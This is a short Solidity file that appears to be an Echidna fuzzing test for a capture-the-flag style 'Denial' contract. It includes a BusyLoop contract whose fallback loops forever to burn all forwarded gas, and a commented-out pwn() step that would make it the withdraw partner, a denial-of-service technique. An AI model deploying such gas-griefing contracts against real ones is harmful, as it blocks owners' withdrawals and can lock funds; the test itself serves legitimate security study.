pragma solidity ^0.5.0;

import 'contract.sol';

contract BusyLoop {
  function() payable external {
    // Burn all gas?
    uint c;
    while (true)
      c = c + 1;
  }
}

contract Test is Denial {
  constructor() public payable {}

  function make_busyloop() public returns (address) {
    return address(new BusyLoop());
  }

  function pwn() public {
    //setWithdrawPartner(make_busyloop());
  }

  function echidna_test_balance() public returns (bool) {
    uint startBalance = owner.balance;
    withdraw();
    uint endBalance = owner.balance;
    return startBalance < endBalance;
  }
}
